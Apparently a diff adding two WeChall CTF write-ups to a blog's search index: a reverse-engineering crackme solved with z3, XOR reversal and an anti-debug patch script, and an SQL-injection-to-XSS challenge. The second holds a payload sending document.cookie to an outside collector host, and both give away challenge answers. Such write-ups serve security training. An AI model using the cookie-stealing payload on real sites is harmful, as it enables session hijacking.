class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    s.add(U[i] &gt;= <span class="number">65</span>, U[i] &lt;= <span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Per-position constraints via table lookup</span></span><br><span class="line">s.add(Or([And(U[<span class="number">0</span>] == c, table_014[c]) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">1</span>] == c, table_014[c]) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">4</span>] == c, table_014[c]) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">2</span>] == c, table_25[c])  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">5</span>] == c, table_25[c])  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">3</span>] == c, table_3[c])   <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hardcoded checks (from assembly)</span></span><br><span class="line">s.add(<span class="number">2</span> * U[<span class="number">0</span>] == <span class="number">174</span>)  <span class="comment"># 0xae → W</span></span><br><span class="line">s.add(<span class="number">2</span> * U[<span class="number">1</span>] == <span class="number">144</span>)  <span class="comment"># 0x90 → H</span></span><br><span class="line">s.add(<span class="number">2</span> * U[<span class="number">4</span>] == <span class="number">154</span>)  <span class="comment"># 0x9a → M</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Accumulator sum</span></span><br><span class="line">s.add(<span class="number">13</span> * (U[<span class="number">0</span>] + U[<span class="number">1</span>] + U[<span class="number">4</span>]) + U[<span class="number">2</span>] + U[<span class="number">3</span>] + U[<span class="number">5</span>] == <span class="number">3285</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(m[U[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> → <span class="subst">&#123;name.lower()&#125;</span>&quot;</span>)</span><br><span class="line">    s.add(Or([U[i] != m[U[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Output:</span></span><br><span class="line"><span class="comment">#   WHGKMG → whgkmg</span></span><br><span class="line"><span class="comment">#   WHOAMI → whoami</span></span><br><span class="line"><span class="comment">#   WHIAMO → whiamo</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>为什么不用 angr？</strong> 此题有 x87
+浮点指令（<code>fprem</code>/<code>fmod</code> 做 Fermat 检验）+
+<code>fork/ptrace</code> 反调试 + <code>INT3</code> 断点检测。angr 的
+VEX IR 对 x87 浮点栈支持弱，<code>fork</code> 会直接 concretize，且
+patch 5 层反调试后 angr 能做的也只是验证已知路径——不如直接 z3
+解约束。</p>
+</blockquote>
+<h3 id="password-逆向-pw_check">Password 逆向
+(<code>pw_check</code>)</h3>
+<h4 id="xor-加密">XOR 加密</h4>
+<p>用 r2 反编译 <code>encrypt</code> 函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ r2 -A -q -c &#x27;pdf @ sym.encrypt&#x27; bsd_thelasthope.elf</span><br></pre></td></tr></table></figure>
+<p><code>main</code> 中定义了 15 字节 XOR key（位于
+<code>[ebp-0x44]</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[0x1f, 0x0a, 0x1e, 0x11, 0x0b, 0x09, 0x19, 0x0f, 0x01, 0x14,</span><br><span class="line"> 0x16, 0x0c, 0x06, 0x0d, 0x65]</span><br></pre></td></tr></table></figure>
+<p><code>encrypt()</code> 函数对密码逐字节 XOR：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    password[i] ^= key[i % <span class="number">15</span>];</span><br></pre></td></tr></table></figure>
+<p>然后 <code>chomp()</code> 去掉末尾换行符，<code>pw_check()</code>
+将结果与硬编码字符串比较。</p>
+<p>用 pwntools 直接读取目标字符串：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;bsd_thelasthope.elf&#x27;</span>)</span><br><span class="line">target = elf.read(<span class="number">0x08049050</span>, <span class="number">10</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;target: <span class="subst">&#123;target&#125;</span>&quot;</span>)  <span class="comment"># Oxw|n]nfog</span></span><br></pre></td></tr></table></figure>
+<p>或直接用 r2：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ r2 -q -c &#x27;ps @ 0x08049050&#x27; bsd_thelasthope.elf</span><br><span class="line">Oxw|n]nfog</span><br></pre></td></tr></table></figure>
+<h4 id="求解-1">求解</h4>
+<p>直接逆向 XOR，key 和密文等长（均为 10 字节）：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encrypted = <span class="string">b&quot;Oxw|n]nfog&quot;</span></span><br><span class="line">key = [<span class="number">0x1f</span>, <span class="number">0x0a</span>, <span class="number">0x1e</span>, <span class="number">0x11</span>, <span class="number">0x0b</span>, <span class="number">0x09</span>, <span class="number">0x19</span>, <span class="number">0x0f</span>, <span class="number">0x01</span>, <span class="number">0x14</span>]</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(e ^ key[i]) <span class="keyword">for</span> i, e <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted))</span><br><span class="line"><span class="comment"># → &quot;PrimeTwins&quot;</span></span><br></pre></td></tr></table></figure>
+<h4 id="验证">验证</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O=0x4f ^ 0x1f = 0x50 = P</span><br><span class="line">x=0x78 ^ 0x0a = 0x72 = r</span><br><span class="line">w=0x77 ^ 0x1e = 0x69 = i</span><br><span class="line">|=0x7c ^ 0x11 = 0x6d = m</span><br><span class="line">n=0x6e ^ 0x0b = 0x65 = e</span><br><span class="line">]=0x5d ^ 0x09 = 0x54 = T</span><br><span class="line">n=0x6e ^ 0x19 = 0x77 = w</span><br><span class="line">f=0x66 ^ 0x0f = 0x69 = i</span><br><span class="line">o=0x6f ^ 0x01 = 0x6e = n</span><br><span class="line">g=0x67 ^ 0x14 = 0x73 = s</span><br></pre></td></tr></table></figure>
+<h3 id="完整-patch-脚本">完整 Patch 脚本</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Patch anti-debug measures in bsd_thelasthope.elf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ELF segment layout:</span></span><br><span class="line"><span class="string">  text: file 0x000000 → VA 0x08048000   (file_off = VA - 0x08048000)</span></span><br><span class="line"><span class="string">  data: file 0x001f00 → VA 0x0804af00   (file_off = VA - 0x08049000)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r+b&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Layer 1: .ctors → nuke anti_ptrace entry (VA 0x0804af04, data seg)</span></span><br><span class="line">        f.seek(<span class="number">0x1f04</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\xff\xff\xff\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 2: NOP call anti_ptrace @ VA 0x08048d59 (5 bytes, text seg)</span></span><br><span class="line">        f.seek(<span class="number">0x0d59</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 3: NOP call signal @ VA 0x08048d6d (5 bytes)</span></span><br><span class="line">        f.seek(<span class="number">0x0d6d</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 4a: NOP int3 @ VA 0x08048d72 (1 byte)</span></span><br><span class="line">        f.seek(<span class="number">0x0d72</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 4b: bypass 0xCC check — jne→jmp @ VA 0x08048d87 (1 byte)</span></span><br><span class="line">        f.seek(<span class="number">0x0d87</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\xeb&#x27;</span>)  <span class="comment"># 0x75(jne) → 0xeb(jmp)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 5: call ptrace → xor eax,eax @ VA 0x08048dc0 (5 bytes)</span></span><br><span class="line">        f.seek(<span class="number">0x0dc0</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\x31\xc0\x90\x90\x90&#x27;</span>)  <span class="comment"># xor eax,eax; nop; nop; nop</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Patched: <span class="subst">&#123;filepath&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    patch(sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;bsd_thelasthope.elf&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>Patch 后运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 patch.py bsd_thelasthope.elf</span><br><span class="line">$ chmod +x bsd_thelasthope.elf</span><br><span class="line">$ ./bsd_thelasthope.elf</span><br><span class="line">User: whoami</span><br><span class="line">Password: PrimeTwins</span><br><span class="line">Correct !! The solution is username_password</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">whoami_PrimeTwins</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>reverse</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>cracking</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - The Cookie is a lie</title>
+    <url>/wp/WeChall/wechall-cookie-is-a-lie/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>The Cookie is a lie (Special)</p>
+<p>You, Chell want to destroy GLaDOS. For this mission you have to steal
+the cookie from GLaDOS in order to get access to the mainframe in the
+Enrichment Center.</p>
+<p>You have found a source code for a web application, which is
+vulnerable to sql-injection and xss attacks. This web application runs
+on the mainframe (accessible only from the internal network).</p>
+<p>Bad news are that you can't access the mainframe without the cookie,
+only GLaDOS can. Another bad news are that the www-user has only read
+access on the mainframe database, and stacking the queries is not
+working.</p>
+<p>You have read the protocols that if GLaDOS receives a new e-mail with
+an id in it, GLaDOS will visit the experience web application above,
+enter the id and click on the first link in order to gather information
+about the new experience subject.</p>
+<p>Your mission is to send a special id to GLaDOS, in order to steal the
+cookie data. (*write Z a PM with the challenge title as subject)</p>
+</blockquote>
+<h3 id="source-code-analysis">Source Code Analysis</h3>
+<p>挑战提供两个 PHP 源码文件：</p>
+<p><strong>experience.php</strong>（主框架上的 Web 应用）:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$query</span>= <span class="string">&quot;SELECT * FROM experience WHERE id=&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$row</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;&gt;Click here to view the file.&lt;/a&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>id</code> 参数无引号拼接 → <strong>SQL 注入</strong></li>
+<li><code>$filename</code> 直接进入
+<code>&lt;a href=$filename&gt;</code> → <strong>XSS (href
+注入)</strong></li>
+<li>过滤：<code>&lt;</code>, <code>&gt;</code>, <code>;</code>
+被删除</li>
+<li><code>magic_quotes_gpc</code> 已关闭，引号可用</li>
+</ul>
+<p><strong>steal_cookie.php</strong>（测试服务器上的 cookie
+收集器）:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$fh</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;evil.txt&#x27;</span>,<span class="string">&#x27;ab&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fh</span>,<span class="variable">$cookie</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br></pre></td></tr></table></figure>
+<p><strong>表结构</strong>（论坛确认）：<code>experience</code> 表有 2
+列：<code>id</code> (int), <code>filename</code> (varchar(500))。</p>
+<h3 id="攻击链">攻击链</h3>
+<ol type="1">
+<li>构造 SQL 注入 payload，使用 <code>UNION SELECT</code> 控制
+<code>filename</code> 字段</li>
+<li><code>filename</code> 设为 <code>javascript:</code> 协议 URL，读取
+<code>document.cookie</code> 并发送到 steal_cookie.php</li>
+<li>PM 给 Z，主题 "The Cookie is a lie"，消息体为 SQLi payload</li>
+<li>GLaDOS bot 读取 PM → 访问 experience.php → 输入 ID →
+点击第一个链接</li>
+<li>cookie 被发送到
+<code>http://test.cake/steal_cookie.php?cookie=...</code></li>
+<li>从 evil.txt 读取 cookie → 提交解</li>
+</ol>
+<p><strong>Payload</strong>（2 列 UNION SELECT）:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 UNION SELECT 1,&quot;javascript:document.location=&#x27;http://test.cake/steal_cookie.php?cookie=&#x27;+document.cookie&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="阻塞原因">阻塞原因</h3>
+<p><strong>GLaDOS bot 已失效</strong>。和 Fix Us 同样的问题——Z 的自动化
+bot 早在 2012 年就已停止运行。</p>
+<h4 id="解题历史佐证">解题历史佐证</h4>
+<p>查看 challenge solvers 页面，解题时间线如下：</p>
+<ul>
+<li>2008-09-20: Visualq, Z (首批)</li>
+<li>2008-09-20 ~ 2012-11-09: 陆续 71 人解出</li>
+<li><strong>2012-11-09: 最后一人解出</strong></li>
+<li>2012-11-09 ~ 至今 (13年+): <strong>零人解题</strong></li>
+</ul>
+<h3 id="参考">参考</h3>
+<ul>
+<li>https://www.wechall.net/en/challenge/Z/cookie_is_a_lie/index.php</li>
+<li>http://www.wechall.net/forum-t102/Challenge_The_Cookie_is_a_lie.html</li>
+</ul>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>xss</tag>
+        <tag>sqli</tag>
+        <tag>wechall</tag>
+        <tag>special</tag>
+      </tags>
+  </entry>
 </search>
